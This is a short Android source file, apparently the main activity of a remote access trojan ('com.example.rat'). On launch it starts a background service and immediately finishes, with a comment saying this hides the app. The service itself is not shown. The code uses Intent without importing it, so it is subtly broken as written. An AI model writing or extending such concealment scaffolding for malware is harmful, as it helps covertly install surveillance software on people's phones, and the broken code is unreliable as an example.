package com.example.rat;

import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Start the service
        startService(new Intent(this, MainService.class));
        
        // Hide the app after starting
        finish();
    }
}
